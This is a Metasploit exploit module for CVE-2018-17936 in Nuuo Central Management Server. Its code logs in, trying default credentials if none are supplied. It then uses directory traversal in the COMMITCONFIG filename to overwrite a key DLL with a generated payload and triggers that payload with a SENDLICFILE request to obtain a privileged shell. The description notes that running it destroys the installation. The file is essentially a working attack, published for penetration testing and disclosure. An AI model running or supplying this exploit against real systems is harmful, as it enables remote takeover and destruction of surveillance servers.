##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# The following versions were tested:
# - 1.5.2 OK
# - 2.1.0 OK
# - 2.3.2 OK
# - 2.4.0 OK
# - 2.6.0 FAIL (vuln fixed?)
# - 2.9.0 FAIL
# - 2.10.0 FAIL

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::Nuuo

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Nuuo Central Management Server Authenticated Arbitrary File Upload",
      'Description'    => %q{
      The COMMITCONFIG verb is used by a CMS client to upload and modify the configuration of the
      CMS Server. An example is below:

      COMMITCONFIG NUCM/1.0
      User-Session-No: <session-number>
      Filename: <filename>
      FileType: <number>
      Content-Lenght: <file-length>
      <FILE_DATA>

      The vulnerability is in the "FileName" parameter, which accepts directory traversal (..\\..\\)
      characters. Therefore, this function can be abused to overwrite any files in the installation
      drive of CMS Server.

      Note that this exploit will destroy the CMS installation - it will replace a key DLL!
      This vulnerability is exploitable in CMS versions up to and including v2.4.

      This module will either use a provided session number (which can be guessed with an auxiliary
      module) or attempt to login using a provided username and password - it will also try the
      default credentials if nothing is provided.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2018-17936' ],
          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02' ],
          [ 'URL', 'FULLDISC_URL_TODO' ],
          [ 'URL', 'GITHUB_URL_TODO' ]
        ],
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          [ 'Nuuo Central Management Server <= v2.4.0', {} ],
        ],
      'Privileged'     => true,
      'DisclosureDate' => "Oct 11 2018",
      'DefaultTarget'  => 0))
  end

  def exploit
    login

    if @session == nil
      fail_with(Failure::NoAccess, "#{peer} - Failed to login to Nuuo CMS")
    end

    print_status("#{peer} - Uploading payload...")
    upload_file("LicenseTool.dll", generate_payload_dll)
    print_status("#{peer} - Sleeping 15 seconds...")
    sleep 15

    print_status("#{peer} - Sending SENDLICFILE request, shell incoming!")
    license_data = rand_text_alpha(rand(300) + 50)
    data = send_data_msg(["SENDLICFILE", "FileName: #{rand_text_alpha(rand(8) + 3)}.lic", \
      "Content-Length: " + license_data.length.to_s], license_data)
    # In order not to destroy the Nuuo CMS installation, we should migrate the process, kill the NCS_Server process and replace the DLL
  end
end
